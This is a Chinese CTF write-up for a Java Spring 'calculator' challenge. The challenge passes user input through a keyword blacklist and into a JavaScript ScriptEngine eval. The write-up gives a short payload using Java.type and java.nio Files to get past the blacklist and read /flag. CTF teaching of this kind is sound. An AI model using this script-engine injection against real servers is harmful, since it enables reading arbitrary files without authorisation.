---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# 眼熟的计算器

## 初步审计

对于 CTF 中的白盒 JAVA 题目，一般有两种出题手法，第一种是直接给一个 jar 包，另一种是给一个 tomcat 的 war 包，分别对应了两种不同的做题思路，这里只讲如何处理 jar 包的形式。

一般而言，题目给的 jar 包都是以 spring 为框架的 JAVA 后端程序，如果你安装了 IDEA，那么可以通过导入依赖的形式来简单的反编译出源码，然后进行审计。

一般而言，我们需要首先查看该程序的依赖，一般存放在 `/META-INF/maven/xxx/xxx/pom.xml` 这个文件中，通过审计这个文件我们可以完整的得知整个 jar 包的依赖和版本情况，这一点与 NodeJS 后端审计是非常相似的。

但是本题中并没有考察依赖相关的事项，我们可以直接去到源码处查看。

一般而言，源码存放在 `/BOOT-INF/classes` 文件目录下，由于是编译过后的 `.class` 文件，我们需要使用反编译器进行反编译操作，一般的 JAVA 编辑器都可以胜任这个工作。（如果你还会一点安卓的话，你也可以使用 jadx 完成上述操作）

本题的源码存在这样一个函数：

```java
private String[] BLACKLIST = new String[]{"import", "java.lang.Runtime", "new"};
private String calculate(String content) throws Exception {
  String[] var2 = this.BLACKLIST;
  int var3 = var2.length;
  for(int var4 = 0; var4 < var3; ++var4) {
    String word = var2[var4];
    if (content.contains(word)) {
      return "Blacklisted word detected: " + word;
    }
  }
  Object result = (new ScriptEngineManager()).getEngineByName("js").eval(content);
  return result.toString();
}
```

我们只需要去理解这里的代码做了一个什么操作就行。

他将我们输入的 `content` 进行了黑名单的过滤，然后使用 `ScrEngineManager` 对象，使用 `js` 类型来进行处理，并且将结果输出出来。

## 漏洞利用

其实这个漏洞利用起来非常简单，无比类似于之前大家做过的 jail 题目，只是环境从 python 换到了 JAVA 而已，通过本地的尝试，我们可以给出这样一个 payload：

```js
var Files = Java.type('java.nio.file.Files');
var Paths = Java.type('java.nio.file.Paths');
var Lines = Files.readAllLines(Paths.get("/flag"))
var String = Java.type('java.lang.String');
String.join('\n', Lines);
```

JAVA 中也有很多有意思的这种类型的 jail 可以出的更加有意思，期待各位未来的创造力。